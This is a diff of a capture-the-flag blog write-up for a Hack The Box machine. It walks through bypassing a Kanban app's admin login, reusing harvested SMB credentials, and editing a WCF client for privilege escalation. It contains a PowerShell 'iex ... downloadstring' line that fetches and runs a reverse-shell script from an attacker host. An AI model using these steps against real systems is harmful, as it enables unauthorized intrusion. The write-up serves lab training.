@@ -52,7 +52,7 @@ published: true
 <p>I needed to read Kanban user guide to know how the porgram works</p>
 
 <p>Page 1: The program is portable so we can edit the config but it will be our responsibility if something happened</p>
-<p>Page 3: Password can be blank but you shouldn`t use it like that </p>
+<p>Page 3: Password can be blank but you shouldn't use it like that </p>
 <p>Page 11: Administrator is the default account and the password is blank </p>
 <p>Page 18: If your forgot the password take executable file to another directorty and run it as admin </p>
 <p>Page 22: Passwords in setup/users tab</p>
@@ -63,18 +63,18 @@ published: true
 
 <p>When i ran it as admin it says that the files has been successfully recoverd</p>
 
-<p>So i tried to sign in as administrator since it`s the default user and that`s the only user we know</p>
+<p>So i tried to sign in as administrator since it's the default user and that's the only user we know</p>
 
 <img src="https://i.ibb.co/p0DLhCf/htb139.jpg" alt="htb139" border="0">
 
 <h1>Config Manipulation</h1>
 
-<p>I can`t log in, So since it`s a portable software let`s take a look at the configuration</p>
+<p>I can't log in, So since it's a portable software let's take a look at the configuration</p>
 
 <img src="https://i.ibb.co/3STVZxd/htb140.jpg" alt="htb140" border="0">
 
-<p>It`s looks like when the application load it takes an encrypted password for the administrator</p>
-<p>As i mentioned earlier we can use a blank password, So now let`s remove the password and try to log in</p>
+<p>It's looks like when the application load it takes an encrypted password for the administrator</p>
+<p>As i mentioned earlier we can use a blank password, So now let's remove the password and try to log in</p>
 
 <img src="https://i.ibb.co/ggf8S9c/htb141.jpg" alt="htb141" border="0">
 
@@ -82,7 +82,7 @@ published: true
 
 <img src="https://i.ibb.co/Tgcbvnc/htb142.jpg" alt="htb142" border="0">
 
-<p>Now let`s go to Setup/users tab to get the passwords</p>
+<p>Now let's go to Setup/users tab to get the passwords</p>
 
 <img src="https://i.ibb.co/BfYFmVT/htb143.jpg" alt="htb143" border="0">
 
@@ -92,11 +92,11 @@ published: true
 
 <pre><span class="line">┌──(m19o@pwning)-[~/m19o/HTB/sharp]</span><br><span class="line">└─<span class="comment"># smbmap -u lars -p G123HHrth234gRG -H 10.10.10.219</span></span><br><span class="line">[+] IP: 10.10.10.219:445        Name: localhost                                         </span><br><span class="line">        Disk                                                    Permissions     Comment</span><br><span class="line">        ----                                                    -----------     -------</span><br><span class="line">        ADMIN$                                                  NO ACCESS       Remote Admin</span><br><span class="line">        C$                                                      NO ACCESS       Default share</span><br><span class="line">        dev                                                     READ ONLY</span><br><span class="line">        IPC$                                                    READ ONLY       Remote IPC</span><br><span class="line">        kanban                                                  NO ACCESS</span><br></pre>
 
-<p>As you see we have permissions on another 2 directories, Let`s list all the files</p>
+<p>As you see we have permissions on another 2 directories, Let's list all the files</p>
 
 <pre><span class="line">┌──(m19o@pwning)-[~/m19o/HTB/sharp]</span><br><span class="line">└─<span class="comment"># smbmap -u lars -p G123HHrth234gRG -H 10.10.10.219 -R</span></span><br><span class="line">[+] IP: 10.10.10.219:445        Name: localhost                                         </span><br><span class="line">        Disk                                                    Permissions     Comment</span><br><span class="line">        ----                                                    -----------     -------</span><br><span class="line">        ADMIN$                                                  NO ACCESS       Remote Admin</span><br><span class="line">        C$                                                      NO ACCESS       Default share</span><br><span class="line">        dev                                                     READ ONLY</span><br><span class="line">        .\dev\*</span><br><span class="line">        dr--r--r--                0 Sun Nov 15 06:30:13 2020    .</span><br><span class="line">        dr--r--r--                0 Sun Nov 15 06:30:13 2020    ..</span><br><span class="line">        fr--r--r--             5632 Sun Nov 15 05:25:01 2020    Client.exe</span><br><span class="line">        fr--r--r--               70 Sun Nov 15 08:59:02 2020    notes.txt</span><br><span class="line">        fr--r--r--             4096 Sun Nov 15 05:25:01 2020    RemotingLibrary.dll</span><br><span class="line">        fr--r--r--             6144 Mon Nov 16 06:55:44 2020    Server.exe</span><br><span class="line">        IPC$                                                    READ ONLY       Remote IPC</span><br><span class="line">        .\IPC$\*</span><br><span class="line">        fr--r--r--                3 Sun Dec 31 19:03:58 1600    InitShutdown</span><br><span class="line">        fr--r--r--                4 Sun Dec 31 19:03:58 1600    lsass</span><br><span class="line">        fr--r--r--                3 Sun Dec 31 19:03:58 1600    ntsvcs</span><br><span class="line">        fr--r--r--                3 Sun Dec 31 19:03:58 1600    scerpc</span><br><span class="line">        fr--r--r--                1 Sun Dec 31 19:03:58 1600    Winsock2\CatalogChangeListener-364-0</span><br><span class="line">        fr--r--r--                3 Sun Dec 31 19:03:58 1600    epmapper</span><br><span class="line">        fr--r--r--                1 Sun Dec 31 19:03:58 1600    Winsock2\CatalogChangeListener-1e4-0</span><br><span class="line">        fr--r--r--                3 Sun Dec 31 19:03:58 1600    LSM_API_service</span><br><span class="line">        fr--r--r--                3 Sun Dec 31 19:03:58 1600    eventlog</span><br><span class="line">        fr--r--r--                1 Sun Dec 31 19:03:58 1600    Winsock2\CatalogChangeListener-190-0</span><br><span class="line">        fr--r--r--                3 Sun Dec 31 19:03:58 1600    atsvc</span><br><span class="line">        fr--r--r--                4 Sun Dec 31 19:03:58 1600    wkssvc</span><br><span class="line">        fr--r--r--                1 Sun Dec 31 19:03:58 1600    Winsock2\CatalogChangeListener-428-0</span><br><span class="line">        fr--r--r--                3 Sun Dec 31 19:03:58 1600    W32TIME_ALT</span><br><span class="line">        fr--r--r--                4 Sun Dec 31 19:03:58 1600    srvsvc</span><br><span class="line">        fr--r--r--                1 Sun Dec 31 19:03:58 1600    vgauth-service</span><br><span class="line">        fr--r--r--                1 Sun Dec 31 19:03:58 1600    Winsock2\CatalogChangeListener-254-0</span><br><span class="line">        fr--r--r--                1 Sun Dec 31 19:03:58 1600    Winsock2\CatalogChangeListener-274-0</span><br><span class="line">        fr--r--r--                1 Sun Dec 31 19:03:58 1600    PIPE_EVENTROOT\CIMV2SCM EVENT PROVIDER</span><br><span class="line">        fr--r--r--                1 Sun Dec 31 19:03:58 1600    PSHost.132546763363573536.2940.DefaultAppDomain.wsmprovhost</span><br><span class="line">        kanban                                                  NO ACCESS</span><br></pre>
 
-<p>That`s a lot of files, let`s get download them on our machine</p>
+<p>That's a lot of files, let's get download them on our machine</p>
 
 <pre><span class="line">smbget -R smb://10.10.10.219/dev/ -U lars%G123HHrth234gRG</span><br></pre>
 
@@ -109,10 +109,10 @@ published: true
 
 <img src="https://i.ibb.co/0G0vGdj/2021-05-01-21-43-58.png" alt="2021-05-01-21-43-58" border="0">
 
-<p>You can see RemoteSample right ?, Let`s see what it contains.</p>
+<p>You can see RemoteSample right ?, Let's see what it contains.</p>
 <img src="https://i.ibb.co/WPf3BSz/2021-05-01-21-44-29.png" alt="2021-05-01-21-44-29" border="0">
 
-<p>It`s connecting to port 8888 and there`s creds as you can see</p>
+<p>It's connecting to port 8888 and there's creds as you can see</p>
 <img src="https://i.ibb.co/k0G1Qdv/2021-05-01-21-44-56.png" alt="2021-05-01-21-44-56" border="0">
 
 <h1>User</h1>
@@ -146,7 +146,7 @@ published: true
 
 <pre><span class="line">PS C:\users\lars\desktop&gt; dir</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\users\lars\desktop</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name</span><br><span class="line">----                -------------         ------ ----</span><br><span class="line">-ar---         1/7/2021   2:17 PM             34 user.txt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PS C:\users\lars\desktop&gt; <span class="built_in">type</span> user.txt</span><br><span class="line">q5e84wq8e4qw8f4dw8f4sdf</span><br></pre>
 
-<p>After enumerating and that took a lot of time i found dir called WCF and that`s a windows service</p>
+<p>After enumerating and that took a lot of time i found dir called WCF and that's a windows service</p>
 
 <pre><span class="line">PS C:\users\lars\documents\wcf&gt; dir</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\users\lars\documents\wcf</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name                                                                 </span><br><span class="line">----                -------------         ------ ----                                                                 </span><br><span class="line">d-----       11/15/2020   1:40 PM                .vs                                                                  </span><br><span class="line">d-----       11/15/2020   1:40 PM                Client                                                               </span><br><span class="line">d-----       11/15/2020   1:40 PM                packages                                                             </span><br><span class="line">d-----       11/15/2020   1:40 PM                RemotingLibrary                                                      </span><br><span class="line">d-----       11/15/2020   1:41 PM                Server                                                               </span><br><span class="line">-a----       11/15/2020  12:47 PM           2095 wcf.sln</span><br></pre>
 
@@ -164,15 +164,15 @@ published: true
 
 <h1>Exploiting WCF</h1>
 
-<p>There is an exe file so let`s De-compile it with Dnspy like we did before</p>
+<p>There is an exe file so let's De-compile it with Dnspy like we did before</p>
 
 <img src="https://i.ibb.co/bdkbjc2/2021-05-01-22-13-16.png" alt="2021-05-01-22-13-16" border="0">
 
-<p>Let`s check what the main function contains</p>
+<p>Let's check what the main function contains</p>
 
 <img src="https://i.ibb.co/Pz8c5rp/2021-05-01-22-15-55.png" alt="2021-05-01-22-15-55" border="0">
 
-<p>It`s connecting to port 8889, WCF is a windows service so it should be running as a privileged user</p>
+<p>It's connecting to port 8889, WCF is a windows service so it should be running as a privileged user</p>
 <p>Now we need to edit the code to get our reverse shell</p>
 
 <pre><span class="line">Console.WriteLine(wcfService.InvokePowerShell(<span class="string">"iex (new-object net.webclient).downloadstring('http://10.10.x.x/Invoke-PowerShellTcp.ps1')"</span>));</span><br></pre>
